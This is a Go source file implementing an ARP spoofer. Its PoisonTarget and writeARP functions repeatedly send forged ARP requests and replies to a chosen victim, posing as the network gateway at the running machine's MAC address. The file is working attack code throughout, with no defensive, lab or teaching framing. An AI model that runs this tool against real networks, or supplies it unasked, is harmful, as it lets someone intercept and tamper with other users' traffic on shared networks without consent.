package main

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/jackpal/gateway"
	"github.com/malfunkt/arpfox/arp"
)

type ArpAddress struct {
	IP           net.IP
	HardwareAddr net.HardwareAddr
	Interface    net.Interface
}

type ArpSpoofer struct {
}

func (spoofer ArpSpoofer) PoisonTarget(target string, targetMAC string) {
	if poisonChannels[target] != nil {
		close(poisonChannels[target])
		poisonChannels[target] = nil
		fmt.Printf("Stopped Poisoning target %s\n", target)
		return
	}
	fmt.Printf("Started Poisoning target %s\n", target)
	iface, err := net.InterfaceByName("Wi-Fi")
	if err != nil {
		fmt.Printf("Could not get interface by name: %s\n", err.Error())
		return
	}
	iface.Name, err = spoofer.getActualDeviceName(iface)
	if err != nil {
		fmt.Printf("Error getting actual device name: %s\n", err.Error())
		return
	}
	handler, err := pcap.OpenLive(iface.Name, 65535, true, pcap.BlockForever)
	if err != nil {
		fmt.Printf("Error Opening Live pcap: %s\n", err.Error())
		fmt.Printf("Interface Name: %s\n", iface.Name)
		return
	}
	defer handler.Close()

	var ifaceAddr *net.IPNet
	ifaceAddrs, err := iface.Addrs()
	if err != nil {
		fmt.Printf("Error getting interface addresses: %s\n", err.Error())
		return
	}
	for _, addr := range ifaceAddrs {
		if ipnet, ok := addr.(*net.IPNet); ok {
			if ip4 := ipnet.IP.To4(); ip4 != nil {
				ifaceAddr = &net.IPNet{
					IP:   ip4,
					Mask: net.IPMask([]byte{0xff, 0xff, 0xff, 0xff}),
				}
				break
			}
		}
	}
	if ifaceAddr == nil {
		fmt.Printf("Could not get interface address\n")
		return
	}

	targetAddr := net.ParseIP(target)
	targetMac, err := net.ParseMAC(targetMAC)
	if err != nil {
		fmt.Printf("Error parsing MAC: %s\n", err.Error())
		fmt.Printf("MAC Address: %s\n", targetMac)
		return
	}
	//hostIP := ifaceAddr.IP

	stop := make(chan struct{}, 2)
	poisonChannels[target] = stop
	go spoofer.readARP(handler, poisonChannels[target], iface)
	gatewayIP, err := gateway.DiscoverGateway()
	if err != nil {
		fmt.Printf("Error finding gateway %s\n", err.Error())
	}
	//replace router
	fakeSrc := arp.Address{
		//IP:           hostIP,
		IP:           gatewayIP,
		HardwareAddr: iface.HardwareAddr,
	}
	<-spoofer.writeARP(handler, poisonChannels[target], targetAddr, targetMac, &fakeSrc, time.Duration(2*1000.0)*time.Millisecond)
}
func (spoofer ArpSpoofer) writeARP(handler *pcap.Handle, stop chan struct{}, targetAddr net.IP, targetMac net.HardwareAddr, src *arp.Address, waitInterval time.Duration) chan struct{} {
	stoppedWriting := make(chan struct{})

	go func(stoppedWriting chan struct{}) {
		t := time.NewTicker(waitInterval)
		i := false
		for {
			select {
			case <-stop:
				stoppedWriting <- struct{}{}
				return
			default:
				<-t.C
				{
					//ONLY IF DONT ALREADY HAVE MAC ADDRESS
					//arpAddr, err := arp.Lookup(targetAddr)
					//if err != nil {
					//	log.Printf("Could not retrieve %v's MAC address: %v", targetAddr, err)
					//	continue
					//}
					dst := &arp.Address{
						IP: targetAddr,
						//HardwareAddr: arpAddr.HardwareAddr,
						HardwareAddr: targetMac,
					}
					//ALTERNATE BETWEEN REQUEST & REPLY
					var buf []byte
					var err error
					if i {
						buf, err = arp.NewARPRequest(src, dst)
						if err != nil {
							log.Print("NewARPRequest: ", err)
							continue
						}
						i = false
					} else {
						buf, err = arp.NewARPReply(src, dst)
						if err != nil {
							log.Print("NewARPReply: ", err)
							continue
						}
						i = true
					}
					//buf, err := arp.NewARPRequest(src, dst)

					if err != nil {
						log.Print("NewARPRequest: ", err)
						continue
					}
					if err := handler.WritePacketData(buf); err != nil {
						log.Print("WritePacketData: ", err)
					}
				}
			}
		}
	}(stoppedWriting)

	return stoppedWriting
}
func (spoofer ArpSpoofer) readARP(handle *pcap.Handle, stop chan struct{}, iface *net.Interface) {
	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	in := src.Packets()

	for {
		var packet gopacket.Packet
		select {
		case <-stop:
			return
		case packet = <-in:
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			packet := arpLayer.(*layers.ARP)
			if !bytes.Equal([]byte(iface.HardwareAddr), packet.SourceHwAddress) {
				continue
			}
			if packet.Operation == layers.ARPReply {
				arp.Add(net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress))
			}
			fmt.Printf("ARP packet (%d): \033[1;32m%v\033[0m (\033[1;32m%v\033[0m) -> \033[1;31m%v\033[0m (\033[1;31m%v\033[0m)\n", packet.Operation, net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress), net.IP(packet.DstProtAddress), net.HardwareAddr(packet.DstHwAddress))
		}
	}
}
func (spoofer ArpSpoofer) getActualDeviceName(iface *net.Interface) (string, error) {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		return "", err
	}

	addrs, err := iface.Addrs()
	if err != nil {
		return "", err
	}

	for _, data := range devices {
		for i := range addrs {
			for j := range data.Addresses {
				if data.Addresses[j].IP.To4() == nil {
					continue
				}
				if addrs[i].(*net.IPNet).Contains(data.Addresses[j].IP) {
					return data.Name, nil
				}
			}
		}
	}

	return "", fmt.Errorf("could not find a network card that matches the interface")
}
